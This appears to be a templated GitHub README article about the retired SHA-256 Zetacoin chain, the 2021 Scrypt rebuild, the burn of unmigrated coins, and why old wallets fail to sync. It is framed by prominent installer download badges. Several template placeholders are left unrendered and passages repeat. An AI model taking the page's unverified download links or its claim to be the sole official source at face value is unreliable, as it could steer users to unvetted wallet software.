![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Is the Old SHA-256 Zetacoin Chain Still Running?</h1>

<p align="center">What still exists from the retired SHA-256 chain, and what it means for an old balance.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

The retired SHA-256 chain still exists as a record and can be reached with a legacy node, but its coins are no longer exchangeable and it is not the network that Zetacoin Wallet uses. The current chain is Scrypt with hybrid consensus, `9...` addresses and roughly 59.9 million ZET in circulation.

## Two chains, one name

Between 2013 and 2021, Zetacoin ran on a Bitcoin-derived SHA-256 chain with a 160 million cap and `Z` prefixed addresses. The 2021 rebuild created the current chain: Scrypt, hybrid Proof-of-Work and Proof-of-Stake, 30-second blocks, `9` prefixed addresses.

Both ledgers exist. Only one is the network that the maintained client follows, and that is the Scrypt chain.

| Property | Legacy chain | Current chain |
| --- | --- | --- |
| Algorithm | SHA-256 | Scrypt |
| Consensus | Proof-of-Work | hybrid PoW and PoS |
| Address prefix | `Z` | `9` |
| Supply | 160M cap, exceeded | approximately 59.9M |
| Coins exchangeable | no | yes |
| Supported by current client | no | yes |

The full walk-through, with the checks in order, is in [Legacy Zetacoin Z-Address Coins](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/legacy-z-address-coins.md).

## What "still running" means here

A legacy node can sync the old chain if it is configured to accept how old its tip is, which is the `maxtipage` setting. That is a research and archaeology exercise: the chain has no exchangeable value and the current client will not follow it.

The old chain's continued existence matters for one practical reason: it explains what people see. An explorer showing old balances, or a wallet that refuses to sync because it is looking at decade-old data, are both symptoms of pointing at the retired chain rather than at the current one.

## Why a wallet gets stuck on it

The current client uses the same data directory as earlier installations. If an old installation's folder is still in place, the client may find legacy chain data and try to follow it, which produces a wallet that never catches up and a balance that looks wrong.

The fix is separation rather than repair: back up the wallet file, rename the old data directory, let the current client build a fresh one, and restore the wallet file into it.

{{ARTICLE:why-old-zetacoin-wallet-wont-sync}} covers that sequence, and {{ARTICLE:where-is-zetacoin-wallet-dat}} gives the paths.

For the background behind this step, [What Happened to the Zetacoin Swap](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/what-happened-to-the-swap.md) covers the same ground in more detail.

## The coins that were left behind

Coins that were not migrated before the window closed on 1 August 2022 were burned to a nulldata address with no private key. That includes unclaimed old-chain balances and the new-chain allocation projected for them.

The result is a retired ledger with balances that cannot move and a burn address that nobody can spend from. It is a closed chapter rather than a dormant opportunity.

## Why the distinction matters to newcomers

A newcomer searching for Zetacoin can find old guides, old explorer pages and old forum threads, all describing the SHA-256 chain. Following those instructions produces a wallet that cannot work, because the instructions predate the rebuild.

The reliable markers of current material are the address prefix, the algorithm and the release page: a `9...` address means current, Scrypt means current, and the repository's releases are the software.

## What the current chain looks like

Blocks arrive every 30 seconds from a mix of miners and stakers, rewards are about 0.1 ZET for PoW and 0.0625 ZET for PoS, and annual emission stays under 50,000 ZET. The network reports peers, and the height is past 4.6 million.

That is a working chain with a small footprint, and it is the one everything else in this pack describes.

## Common questions

### Can I still mine the old chain?

Technically with legacy software and a legacy node, but its coins have no exchangeable value.

### Why does my explorer show old balances?

Because it is showing the retired chain, or a snapshot of it. Current balances live on the Scrypt chain.

### Do old coins affect the current supply?

No. The current supply is approximately 59.9 million after the burn, separate from the legacy ledger.

### Is the old chain maintained?

No new development targets it. The maintained client follows the current chain only.

## The short version

The old chain is a record, not a network to use. Current means Scrypt, `9...` addresses and the maintained client.

Related pages: {{ARTICLE:zetacoin-legacy-z-address-coins}} for Z balances, {{ARTICLE:what-happened-to-zetacoin-swap}} for the migration, {{ARTICLE:why-old-zetacoin-wallet-wont-sync}} for the stuck-wallet case, and {{ARTICLE:is-zetacoin-still-active-today}} for the current status. {{RELEASE}} is where the current client lives.

## Why anyone still asks

The old chain left traces everywhere: forum posts, guides, explorer pages and wallet downloads that predate the rebuild. A person searching for Zetacoin today can find a coherent description of the 2013 coin and never encounter the current one.

That is a search problem rather than a chain problem, and the cure is the same set of markers every time: a `9...` address means current, Scrypt means current, and the repository's releases are the software. Anything that describes SHA-256, a `Z` prefix or a 160 million cap is describing the retired ledger.

## What the retired chain is good for

Two things. It is a historical record of holdings before the migration, which matters to anyone reconstructing what they had. And it explains a class of confusing symptoms: a node that will not sync, an explorer showing an unfamiliar balance, a client that refuses to follow the network.

Recognising the retired chain for what it is saves hours of troubleshooting a wallet that is not broken at all, just pointed at the wrong history.

For the current network's state, {{ARTICLE:is-zetacoin-still-active-today}} gives the signals to check, and {{ARTICLE:what-is-zetacoin-cryptocurrency}} describes the protocol the current chain runs.

## How the two chains ended up coexisting

A rebuild that keeps the coin and the community leaves the old ledger intact, because a chain cannot be deleted. What changes is which chain the network follows and which clients are built for it.

That is why the retired chain can still be synced by legacy software while nobody mines it for value and no exchange accepts it. It is a ledger with history and no economy, and the distinction explains both the explorer balances and the confusion they cause.

The practical test for any guide, wallet or download is which chain it targets. A single look at the address prefix and the algorithm answers it, and a guide that never mentions either is probably older than the rebuild.

{{ARTICLE:zetacoin-legacy-z-address-coins}} covers the balances people still see, and {{ARTICLE:why-old-zetacoin-wallet-wont-sync}} covers the client that gets stuck on them.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Why an Old Zetacoin Wallet Will Not Sync](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/why-an-old-wallet-will-not-sync.md)
- [What Happened to the Zetacoin Swap](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/what-happened-to-the-swap.md)
- [Legacy Zetacoin Z-Address Coins](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/legacy-z-address-coins.md)
